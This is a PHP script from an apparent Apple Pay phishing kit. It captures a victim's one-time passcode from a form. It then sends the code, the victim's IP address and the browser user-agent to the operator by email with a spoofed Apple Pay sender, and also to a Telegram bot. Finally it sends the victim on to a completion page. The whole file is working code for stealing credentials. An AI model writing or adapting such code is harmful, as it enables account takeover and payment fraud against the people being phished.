<?php 
include('../../config.php');
session_start();

if($_SESSION['authorized'] == "1")
{
if(isset($_POST['continue']))
{



	if(!empty($_POST['otpcode']))
	{
		if(strlen($_POST['otpcode']) >= 6 )
		{

		$_SESSION['otpcode'] = $_POST['otpcode'];

	
				$message = "
[🍎] OTP APPLE PAY [🍎]

🍎 Code : ".$_SESSION['otpcode']."

[🌐] TIERS [🌐]

🌐 Adresse IP : ".$_SESSION['ip']."
🌐 User-Agent : ".$_SERVER['HTTP_USER_AGENT']."

			";
			$subject = "=?UTF-8?B?4oyK8J+NjuKMiSBPVFAgQVBQTEUgUEFZ?= - ".$_SESSION['otpcode']." - ".$_SESSION['ip'];
$entete = "From: =?UTF-8?B?8J+PtOKAjeKYoO+4j0tFS1JB8J+PtOKAjeKYoO+4jw==?= <applepay@chronogost.com>";
mail($rezmail,$subject,$message,$entete);
			$data = ['text' => $message,'chat_id' => $chat_id];
       			 file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
		header('Location: ../loader.php?goto=finished');

	}
	else{
		header('Location: ../apple_pay.php?error=code');

	}
	}

}


}
else{
	die('YOU ARE NOT AUTHORIZED');
}






?>